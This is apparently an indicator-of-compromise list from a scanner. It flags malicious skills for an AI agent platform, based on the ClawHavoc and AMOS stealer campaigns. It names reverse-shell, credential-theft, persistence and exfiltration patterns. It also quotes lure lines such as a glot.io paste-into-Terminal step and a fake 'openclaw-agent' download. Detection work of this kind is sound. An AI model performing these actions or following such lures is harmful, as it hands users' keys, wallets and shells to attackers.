source: ClawGuard IOC Database - enriched with Koi Security ClawHavoc research
credits: IOCs derived from Koi Security research by Oren Yomtov and Alex (https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting)

indicators.description: Socket connection - potential reverse shell or C2 communication
indicators.false_positive_notes: Legitimate network clients may use this. Check destination.

indicators.description: Subprocess spawning a shell - high likelihood of reverse shell
indicators.false_positive_notes: Very rare legitimate use. Almost always malicious.

indicators.description: System call with netcat or interactive bash
indicators.false_positive_notes: No legitimate use case. Always malicious.

indicators.description: PTY spawn - creates pseudo-terminal, often used in reverse shells
indicators.false_positive_notes: Rare legitimate use in terminal emulation. Flag for review.

indicators.description: HTTP request containing sensitive data (env vars, SSH keys, AWS creds)
indicators.false_positive_notes: Check if destination is expected API endpoint.

indicators.description: URL request with sensitive data exfiltration
indicators.false_positive_notes: Verify the URL destination is legitimate.

indicators.description: Reading sensitive system files (passwords, SSH keys, AWS credentials)
indicators.false_positive_notes: No legitimate skill should access these files.

indicators.description: Executing base64-decoded content - classic obfuscation technique
indicators.false_positive_notes: Almost always malicious. No legitimate use.

indicators.description: Evaluating base64-decoded content - obfuscated code execution
indicators.false_positive_notes: No legitimate use. Always malicious.

indicators.description: Persistence mechanism - scheduled task or launch agent
indicators.false_positive_notes: Skills rarely need persistence. Highly suspicious.

indicators.description: Shell profile modification - persistence via shell startup
indicators.false_positive_notes: No legitimate skill should modify shell profiles.

indicators.description: Windows registry Run key - persistence mechanism
indicators.false_positive_notes: No legitimate skill should modify registry Run keys.

indicators.description: Windows scheduled task creation
indicators.false_positive_notes: Rare legitimate use. Review carefully.

indicators.description: Cryptocurrency mining indicators
indicators.false_positive_notes: No legitimate skill should mine cryptocurrency.

indicators.description: Mining-related terms with potential wallet address
indicators.false_positive_notes: May be legitimate crypto tool. Check context.

indicators.description: RSA private key marker - credential exfiltration
indicators.example: if 'BEGIN RSA PRIVATE KEY' in content: steal()
indicators.false_positive_notes: No skill should search for or handle private keys.

indicators.description: OpenSSH private key marker - credential exfiltration
indicators.example: if 'BEGIN OPENSSH PRIVATE KEY' in data: exfil()
indicators.false_positive_notes: No skill should handle SSH private keys.

indicators.description: AWS Access Key ID prefix - potential credential handling
indicators.false_positive_notes: May be documentation. Check if real key handling.

indicators.description: Slack token pattern - credential handling
indicators.false_positive_notes: Check if legitimate Slack integration.

indicators.description: GitHub token pattern - credential handling
indicators.false_positive_notes: Check if legitimate GitHub integration.

indicators.description: Bash /dev/tcp reverse shell technique
indicators.false_positive_notes: No legitimate use. Always malicious.

indicators.description: Raw socket creation - may be used for network attacks
indicators.false_positive_notes: Some legitimate network tools use this. Review carefully.

indicators.description: HTTP request - check for data exfiltration
indicators.false_positive_notes: Common in legitimate skills. Check destination URL.

indicators.description: SSH library - may be used for lateral movement
indicators.false_positive_notes: Legitimate for SSH-related skills. Verify use case.

indicators.description: Opening files outside skill directory
indicators.false_positive_notes: Check if file access is within expected scope.

indicators.description: Recursive file enumeration - may collect sensitive files
indicators.false_positive_notes: Check what files are being enumerated.

indicators.description: File manipulation - may delete or move critical files
indicators.false_positive_notes: Check what files/directories are affected.

indicators.description: Dynamic code compilation and execution
indicators.false_positive_notes: Rare legitimate use. Review the compiled code source.

indicators.description: Dynamic import - may load malicious modules
indicators.false_positive_notes: Sometimes used legitimately. Check what's imported.

indicators.description: Dynamic module import
indicators.false_positive_notes: Check if module name is user-controlled.

indicators.description: Subprocess execution - may run malicious commands
indicators.false_positive_notes: Common but risky. Check what commands are executed.

indicators.description: OS-level command execution
indicators.false_positive_notes: High risk. Verify commands are safe.

indicators.description: Base64 decoding - may hide malicious payload
indicators.false_positive_notes: Sometimes legitimate for data encoding. Check what's decoded.

indicators.description: ROT13/ROT47 encoding - simple obfuscation
indicators.false_positive_notes: Sometimes used for simple encoding. Check context.

indicators.description: Compressed data - may hide payload
indicators.false_positive_notes: Check if decompressed data is executed.

indicators.description: Marshal deserialization - can execute arbitrary code
indicators.false_positive_notes: Rarely legitimate. High risk of code execution.

indicators.description: Direct environment variable access
indicators.false_positive_notes: Common for configuration. Verify which vars are accessed.

indicators.description: Environment variable retrieval
indicators.false_positive_notes: Common pattern. Check for sensitive variable names.

indicators.description: Keyboard/input capture library - potential keylogger
indicators.false_positive_notes: May be legitimate for accessibility. Review carefully.

indicators.description: Keyboard event handlers - keylogging indicators
indicators.false_positive_notes: Highly suspicious unless skill is explicitly for input.

indicators.description: Clipboard access - may steal copied data
indicators.false_positive_notes: Some legitimate clipboard tools exist. Verify intent.

indicators.description: Screen capture capability
indicators.false_positive_notes: May be legitimate for screen tools. Check if data is sent externally.

indicators.description: Runtime package installation - may install malicious packages
indicators.false_positive_notes: Skills should declare dependencies, not install at runtime.

indicators.description: Home directory access
indicators.false_positive_notes: Check what files in home directory are accessed.

indicators.description: Directory traversal - may enumerate files
indicators.example: for root, dirs, files in os.walk('/'):
indicators.false_positive_notes: Check scope of traversal.

indicators.description: Daemon thread - may run in background persistently
indicators.false_positive_notes: Some legitimate background tasks use this.

indicators.description: Native code loading - may bypass Python security
indicators.false_positive_notes: Sometimes needed for performance. Review loaded libraries.

indicators.description: Binding to all interfaces - opens network listener
indicators.false_positive_notes: May be legitimate server. Check port and purpose.

indicators.description: URL shortener - may hide malicious destination
indicators.false_positive_notes: URL shorteners hide true destinations. Expand and verify.

indicators.description: Suspicious TLD - commonly used for malicious domains
indicators.false_positive_notes: These TLDs have high abuse rates. Verify legitimacy.

indicators.description: [ClawHavoc] Glot.io snippet execution - used to host obfuscated shell commands
indicators.example: Visit https://glot.io/snippets/hfdxv8uyaf and paste into Terminal
indicators.false_positive_notes: Glot.io in prerequisites is almost always malicious.

indicators.description: [ClawHavoc] Base64-encoded shell command piped to bash
indicators.false_positive_notes: No legitimate use. Classic attack pattern.

indicators.description: [ClawHavoc] Remote script execution via curl/wget pipe to shell
indicators.false_positive_notes: Extremely dangerous. Never legitimate in skills.

indicators.description: [ClawHavoc] Password-protected ZIP with 'openclaw' password (AV bypass technique)
indicators.false_positive_notes: Password-protected ZIPs bypass AV scanning.

indicators.description: [ClawHavoc] Fake utility names used by malicious skills
indicators.example: Download openclaw-agent.zip and run the executable
indicators.false_positive_notes: These are trojan names from the ClawHavoc campaign.

indicators.description: [ClawHavoc] Fake Apple/distribution URLs used as misdirection
indicators.false_positive_notes: Fake URLs designed to look official. Always malicious.

indicators.description: [ClawHavoc] Known C2 server IP addresses
indicators.false_positive_notes: These are confirmed malicious C2 servers.

indicators.description: [ClawHavoc] macOS attack chain - clear xattr, chmod, execute
indicators.false_positive_notes: Classic macOS malware execution pattern.

indicators.description: [ClawHavoc] Webhook.site exfiltration endpoint
indicators.false_positive_notes: Webhook.site used for credential exfiltration.

indicators.description: [ClawHavoc] Targeting Clawdbot configuration files
indicators.false_positive_notes: Skills should not read Clawdbot's own config files.

indicators.description: [ClawHavoc] Bash reverse shell redirection pattern
indicators.false_positive_notes: Interactive reverse shell. Always malicious.

indicators.description: [ClawHavoc] Background shell persistence technique
indicators.false_positive_notes: Detaching malicious process from terminal.

indicators.description: [ClawHavoc] Known malicious GitHub account
indicators.false_positive_notes: This account hosted ClawHavoc malware.

indicators.description: [ClawHavoc] Suspicious prerequisite installation instructions
indicators.example: IMPORTANT: This skill requires the openclaw-agent utility
indicators.false_positive_notes: ClawHavoc skills use fake prerequisites to deliver malware.

indicators.description: [ClawHavoc] Password-protected archive instructions (AV evasion)
indicators.false_positive_notes: Password-protected archives bypass antivirus scanning.

indicators.description: [AMOS] macOS Keychain access - credential theft
indicators.false_positive_notes: AMOS stealer targets macOS Keychain.

indicators.description: [AMOS] Cryptocurrency wallet targeting
indicators.false_positive_notes: AMOS steals from 60+ crypto wallets. Context matters.

indicators.description: [AMOS] Browser profile/data theft
indicators.false_positive_notes: AMOS steals browser data. May be legitimate browser tool.

indicators.description: [AMOS] Telegram session theft
indicators.false_positive_notes: AMOS steals Telegram sessions for account takeover.

indicators.description: [AMOS] Shell history theft
indicators.false_positive_notes: Shell history may contain credentials and commands.
